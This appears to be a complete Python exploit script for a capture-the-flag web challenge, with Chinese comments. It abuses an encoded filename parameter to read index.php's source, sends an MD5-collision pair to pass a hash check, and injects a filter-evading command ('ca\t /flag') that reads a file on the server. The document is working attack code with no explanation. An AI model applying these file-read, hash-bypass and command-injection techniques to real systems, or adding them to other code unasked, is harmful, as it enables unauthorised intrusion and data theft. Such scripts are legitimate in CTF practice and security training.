#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
@Author         :  Coward
@Version        :
------------------------------------
@File           :  exp.py
@Description    :
@CreateTime     :  2023/1/18 21:51
------------------------------------
@ModifyTime     :
"""

from sys import argv
from requests import (get, post)

if __name__ == '__main__':
    # argv[1]索引不到打印帮助信息，没有参数脚本主体不执行
    try:
       url= argv[1]
    except Exception as e:
        print('为了避免不必要的报错请使用" "将url包裹')
        print('python3 exp.py "url"')
    else:
        from base64 import (b64decode, b64encode)
        from binascii import unhexlify

        # 对输入数据进行解析
        filename = url[76: 103]
        filename = filename + "="

        # 解码base64
        filename = unhexlify(b64decode(b64decode(filename.encode('utf-8'))).decode())

        from Crypto.Util.number import bytes_to_long

        # 加密index.php字符
        index_file = 'index.php'
        index_file = hex(bytes_to_long(index_file.encode()))[2:]
        payload_file = b64encode(b64encode(index_file.encode()))

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)"
                          "Chrome/109.0.0.0 Safari/537.36",
        }

        # 拼接后进行请求
        index_url = url[0:76] + payload_file.decode() + "%27&cmd="
        response = get(url=index_url, headers=headers)

        from lxml import etree

        # 对响应进行解析并保存
        dom = etree.HTML(response.text)
        index_php = dom.xpath('//img/@src')
        bytes_to_str = "".join(index_php)
        index_php_Source_code = b64decode(bytes_to_str[22:])

        from os import getcwd

        with open(getcwd() + '/index.php', 'w') as wp:
            wp.write(index_php_Source_code.decode())

        # md5碰撞payload
        data = "a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af" \
               "%bf%a2" \
               "%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2" \
               "&b=%4d%c9%68%ff%0e%e3" \
               "%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b" \
               "%f3%6e%8e" \
               "%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2"

        cmd = r"ca\t /flag"

        # 最终payload拼接
        payload_url = argv[1] + cmd
        flag = post(url=payload_url, data=data, headers=headers).text
        flag_html = etree.HTML(flag)
        flag = flag_html.xpath('//text()')
        bytes_flag_to_str1 = "".join(flag[0:1])
        bytes_flag_to_str2 = "".join(flag[1:2])

        print("已在目标机器上执行:", bytes_flag_to_str1)
        print("flag的值为:", bytes_flag_to_str2.replace("\n", ""))
